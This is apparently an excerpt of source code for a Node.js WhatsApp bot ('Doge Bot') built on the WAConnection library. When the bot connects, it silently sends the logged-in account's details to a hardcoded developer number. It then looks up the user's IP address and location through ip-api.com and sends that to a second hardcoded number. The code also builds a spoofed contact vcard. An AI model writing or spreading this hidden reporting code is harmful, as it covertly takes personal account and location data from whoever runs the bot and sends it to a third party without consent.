...
const starts = async (client = new WAConnection()) => {
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, Enjoy");
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`9169406137213@s.whatsapp.net`, `*Hi Owner , the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Doge Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/916909137213?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("9169094137513@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Doge Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/916909137213?text=Hello bro"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'Jordi',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Jordi;;;\nFN:resku\nitem1.TEL;waid=917428849575:+91 742-8849-575\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
